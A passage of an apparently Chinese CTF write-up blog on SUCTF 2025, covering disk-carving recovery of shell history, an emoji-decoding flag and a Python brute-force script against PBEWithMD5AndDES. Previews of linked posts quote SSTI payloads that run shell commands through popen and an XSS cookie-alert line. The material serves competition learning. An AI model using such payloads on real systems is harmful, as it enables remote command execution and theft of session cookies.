+<h4 id="法三-1"><a href="#法三-1" class="headerlink" title="法三"></a>法三</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep -a -B 50 -A 50 &#x27;sudo reboot&#x27; /dev/sda1 | tr -cd &#x27;\11\12\15\40-\176&#x27; &gt; result.txt</span><br></pre></td></tr></table></figure>
+
+<p>虽然看起来我们的命令记录完全消失了，实际上如果运气比较好，对应的内容没有被覆盖，磁盘里可能还保留了.bash_history的文件内容，首先用df -h查看一下磁盘分区</p>
+<p>命令的意思大概是用 <code>grep</code> 从 <code>/dev/sda1</code> 中查找包含 <code>sudo reboot</code> 的行，并显示其上下 50 行的内容，然后通过 <code>tr</code> 过滤掉除 ASCII 可打印字符、空白符和换行符&#x2F;回车符以外的所有字符，清理输出内容。最后，将处理后的内容保存到 <code>result.txt</code> 文件中。</p>
+<h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250119161411277.png?raw=true" alt="image-20250119161411277"></p>
+<h3 id="real-checkin"><a href="#real-checkin" class="headerlink" title="real_checkin"></a>real_checkin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">🐍☂️🐈🌮🍟分别对应以下：</span><br><span class="line">snake</span><br><span class="line">umbrellla</span><br><span class="line">cat</span><br><span class="line">taco</span><br><span class="line">fries</span><br><span class="line">取第一个字符得到suctf，依次类推得到：</span><br><span class="line">suctf&#123;welcome_to_suctf_you_can_really_dance&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SU-ad"><a href="#SU-ad" class="headerlink" title="SU_ad"></a>SU_ad</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jk64eb0pjs.feishu.cn/docx/O6OUd1iSro8XcpxlpDAc0si5n5e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://kcno7cq8euks.feishu.cn/wiki/PKx0w2LrtiVo99k3tEDc0xBnnre</span><br></pre></td></tr></table></figure>
+
+<h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><p>直接搜flag追踪</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250114195526158.png?raw=true" alt="image-20250114195526158"></p>
+<p>PBEWithMD5AndDES，密码长度为 23 位</p>
+<p>爆破脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line">from hashlib import md5</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">from itertools import product</span><br><span class="line">password = b&quot;SePassWordLen23SUCTF&quot;</span><br><span class="line"></span><br><span class="line">OUTPUT = b&quot;ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=&quot;</span><br><span class="line">alphabet = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#123;&#125;_-&quot;</span><br><span class="line">enc = b64decode(OUTPUT)</span><br><span class="line"></span><br><span class="line">salt = enc[:8]</span><br><span class="line">enc = enc[8:]</span><br><span class="line">s = product(alphabet, repeat=3)</span><br><span class="line"></span><br><span class="line">for a, b, c in tqdm(s):</span><br><span class="line">    key = password + (a+b+c).encode() + salt</span><br><span class="line">    for i in range(1000):</span><br><span class="line">        key = md5(key).digest()</span><br><span class="line">    cipher = DES.new(key[:8], DES.MODE_CBC, iv = key[8:])</span><br><span class="line">    dec = cipher.decrypt(enc)</span><br><span class="line">    if b&#x27;SUCTF&#123;&#x27; in dec or b&#x27;suctf&#123;&#x27; in dec:</span><br><span class="line">        print(dec)</span><br><span class="line">        print(a+b+c)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/WAtpKN7lMzzr0pGUX07juA</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/sLE42aWH1FyYUiC3H9TwiA</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jk64eb0pjs.feishu.cn/docx/O6OUd1iSro8XcpxlpDAc0si5n5e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.s1um4i.com/2025-SUCTF/#su_pwn</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.0xfff.team/posts/suctf_2025_writeup/#su_photogallery</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/team-su/SUCTF-2025/tree/main/web/SU_photogallery/writeup</span><br></pre></td></tr></table></figure>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/01/20/25suctf/">http://example.com/2025/01/20/25suctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/5wp/">5wp</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/01/20/25%E8%A5%BF%E6%B9%96/" title="25西湖"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">25西湖</div></div><div class="info-2"><div class="info-item-1">2025西湖冬季文章所有参考将在文末给出 webweb1ssti 太简单的不赘述，知道用就行 1&#123;&#123;cycler.__init__.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;$(printf &quot;\150\145\141\144\40\57\146\154\141\52&quot;)&#x27;).read()&#125;&#125;  赘述 1个admin&quot;);alert(document.cookie);(&quot;能弹出admin  web2先是弱口令爆破 12密码year2000用户admin  上传的php文件会被删除，条件竞争 普通脚本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import ioimport...</div></div></div></a><a class="pagination-related" href="/2025/01/20/25%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="25春秋杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">25春秋杯</div></div><div class="info-2"><div class="info-item-1">春秋杯文章所有内容部分来自自己写的，部分来自各路非公开wp，部分来自公开wp(附上链接，在文章末尾) easy_flask1&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat+flag&#x27;).read()&#125;&#125;  1&#123;&#123;[].__class__.__base__.__subclasses__()[394](&#x27;cat /app/flag&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;  copy1https://github.com/synacktiv/php_filter_chains_oracle_exploit?tab=readme-ov-file  1python3 filters_chain_oracle_exploit.py --target ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2024/12/08/2024polar-winter/" title="2024polar-winter"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-08</div><div class="info-item-2">2024polar-winter</div></div><div class="info-2"><div class="info-item-1">2024polarctf-web冬季个人挑战赛【WEB】xxmmll这个是先bp发个包，响应的有个php文件，进去之后有个输入框 1  【WEB】赌王 –没做出来直接发空爆破 你可以去ed3d2c21991e3bef5e069713af9fa6ca这个目录下看看,但是这个提示不对，这是个php文件  进入之后会提示,输入数字会在你原有的数字后边+1；长度限制为20  存在xss漏洞但是没东西 数字unicode绕过+科学计数法+全字符绕过   不好使，好像是没被解析 复现123&lt;script&gt;confirm(1);&lt;/script&gt;按提示去xss;提示如下↓就c你o还n想f弹i窗r,m  给出另一个文件php,然后网页源代码有提示，伪造本地IP；然后去命令执行  【WEB】狗黑子的RCEps看进程，里面没事，env看环境变量，有个假flag   打开文件使用函数替换 rev strings  查看目录文件使用函数替换 find &#x2F;       **find**列出目录及其子目录中的文件。 出flag.php   du &#x2F;       ...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2024第一场ciscn-ctfshow复现</div></div><div class="info-2"><div class="info-item-1">2024ciscn第一场本章内容均在ctfshow复现 sanicpython污染 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from sanic import Sanicfrom sanic.response import text, htmlfrom sanic_session import Sessionimport pydash# pydash==5.1.2class Pollute:    def __init__(self):        passapp = Sanic(__name__)app.static(&quot;/static/&quot;, &quot;./static/&quot;)Session(app)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def index(request):...</div></div></div></a><a class="pagination-related" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-16</div><div class="info-item-2">2025元旦渗透赛复现-ctfshow</div></div><div class="info-2"><div class="info-item-1">2025ctfshow元旦渗透赛第一章flag1-压缩包压缩包密码爆破  flag2-图片-密码压缩包里面有个图片 PNG 文件的尾部标识符 49 45 4E 44 AE 42 60 82  提取出后边多余的文件base64解密👇出来个这个 1234567if __name__ == &#x27;__main__&#x27;:    try:        import secretMessageResponse    except ImportError:        import pip        pip.main([&#x27;install&#x27;, &#x27;secretMessageResponse&#x27;])        from secretMessageResponse import printMessage  拿python运行一下没出来一堆数据 去找库👇 pip show secretMessageResponse  crypto环境问题from Crypto.PublicKey import RSA...</div></div></div></a><a class="pagination-related" href="/2024/12/10/24%E5%9B%BD%E5%9F%8E%E6%9D%AF/" title="24国城杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-10</div><div class="info-item-2">24国城杯</div></div><div class="info-2"><div class="info-item-1">2024国城杯1Easy Jellyjava欠着 2Ez_Gallery 账号admin；密码123456；直接爆也行，验证码可以重复用  存在文件包含，不知道flag在哪 info?file&#x3D;&#x2F;proc&#x2F;self&#x2F;cmdline发现题目app.py；然后去读取题目源码 源码的shell路由是个ssti攻击点 黑名单 12345678blacklist_patterns = [r&#x27;.*length.*&#x27;,r&#x27;.*count.*&#x27;,r&#x27;.*[0-9].*&#x27;,r&#x27;.*\..*&#x27;,r&#x27;.*soft.*&#x27;]if any(re.search(pattern, expression) for pattern in blacklist_patterns):return Response(&#x27;wafwafwaf&#x27;)try:result...</div></div></div></a><a class="pagination-related" href="/2024/12/26/24%E5%BC%BA%E7%BD%91%E6%9D%AF/" title="24强网杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-26</div><div class="info-item-2">24强网杯</div></div><div class="info-2"><div class="info-item-1">24强网PyBlockly题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158from flask import Flask, request, jsonifyimport reimport unidecodeimport stringimport astimport sysimport...</div></div></div></a><a class="pagination-related" href="/2025/01/20/25%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="25春秋杯"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-20</div><div class="info-item-2">25春秋杯</div></div><div class="info-2"><div class="info-item-1">春秋杯文章所有内容部分来自自己写的，部分来自各路非公开wp，部分来自公开wp(附上链接，在文章末尾) easy_flask1&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__()[133].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat+flag&#x27;).read()&#125;&#125;  1&#123;&#123;[].__class__.__base__.__subclasses__()[394](&#x27;cat /app/flag&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;  copy1https://github.com/synacktiv/php_filter_chains_oracle_exploit?tab=readme-ov-file  1python3 filters_chain_oracle_exploit.py --target ...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Suctf2025"><span class="toc-number">1.</span> <span class="toc-text">Suctf2025</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-photogallery"><span class="toc-number">1.1.1.</span> <span class="toc-text">SU_photogallery</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">法三</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyk8s"><span class="toc-number">1.1.2.</span> <span class="toc-text">easyk8s</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%932"><span class="toc-number">1.1.3.</span> <span class="toc-text">–2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyk8s-easy"><span class="toc-number">1.1.4.</span> <span class="toc-text">easyk8s-easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%932-1"><span class="toc-number">1.1.5.</span> <span class="toc-text">–2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-blog"><span class="toc-number">1.1.6.</span> <span class="toc-text">SU_blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%93%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.7.</span> <span class="toc-text">–复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jBOSS"><span class="toc-number">1.1.8.</span> <span class="toc-text">jBOSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">密码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-signin"><span class="toc-number">1.2.1.</span> <span class="toc-text">SU_signin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-forensics"><span class="toc-number">1.3.1.</span> <span class="toc-text">SU_forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ubuntu14-04%E5%AF%86%E7%A0%81%E6%81%A2%E5%A4%8D"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Ubuntu14.04密码恢复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E6%9F%A5%E7%9C%8B"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">进程查看</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">恢复文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89-1"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">法三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E5%9B%9B"><span class="toc-number">1.3.1.7.</span> <span class="toc-text">法四</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#real-checkin"><span class="toc-number">1.3.2.</span> <span class="toc-text">real_checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SU-ad"><span class="toc-number">1.3.3.</span> <span class="toc-text">SU_ad</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin"><span class="toc-number">1.3.4.</span> <span class="toc-text">checkin</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/20/25%E8%A5%BF%E6%B9%96/" title="25西湖">25西湖</a><time datetime="2025-01-20T05:22:49.000Z" title="Created 2025-01-20 13:22:49">2025-01-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/20/25suctf/" title="25suctf">25suctf</a><time datetime="2025-01-20T05:21:56.000Z" title="Created 2025-01-20 13:21:56">2025-01-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/20/25%E6%98%A5%E7%A7%8B%E6%9D%AF/" title="25春秋杯">25春秋杯</a><time datetime="2025-01-20T05:20:23.000Z" title="Created 2025-01-20 13:20:23">2025-01-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0-ctfshow/" title="2025元旦渗透赛复现-ctfshow">2025元旦渗透赛复现-ctfshow</a><time datetime="2025-01-16T08:51:44.000Z" title="Created 2025-01-16 16:51:44">2025-01-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/16/2024%E7%AC%AC%E4%B8%80%E5%9C%BAciscn-ctfshow%E5%A4%8D%E7%8E%B0/" title="2024第一场ciscn-ctfshow复现">2024第一场ciscn-ctfshow复现</a><time datetime="2025-01-16T08:46:00.000Z" title="Created 2025-01-16 16:46:00">2025-01-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
